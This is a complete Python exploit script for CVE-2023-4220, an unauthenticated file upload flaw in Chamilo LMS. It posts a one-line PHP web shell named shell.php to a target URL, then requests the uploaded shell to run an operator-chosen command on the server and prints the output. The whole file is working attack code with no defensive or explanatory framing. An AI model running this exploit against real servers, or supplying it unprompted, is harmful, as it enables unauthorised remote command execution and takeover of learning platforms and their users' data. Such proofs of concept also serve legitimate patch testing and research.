import requests
import argparse

def upload_shell(target_url, cmd):
    # Payload containing the PHP web shell
    payload = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    
    # Upload the payload
    response = requests.post(target_url, files=payload)
    
    if response.status_code == 200:
        print("[+] File uploaded successfully!")
        shell_url = target_url.rstrip('/').rsplit('/', 1)[0] + "/uploads/shell.php?cmd=" + cmd
        print(f"[+] Access the shell at: {shell_url}")
        
        # Execute the command
        shell_response = requests.get(shell_url)
        print(f"[+] Command Output: {shell_response.text}")
    else:
        print("[-] File upload failed.")

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="CVE-2023-4220 Chamilo LMS Unauthenticated File Upload RCE Exploit")
    parser.add_argument('target_url', help="The target URL for the Chamilo LMS instance")
    parser.add_argument('cmd', help="The command to execute on the remote server")
    
    args = parser.parse_args()
    
    # Run the exploit with the provided arguments
    upload_shell(args.target_url, args.cmd)
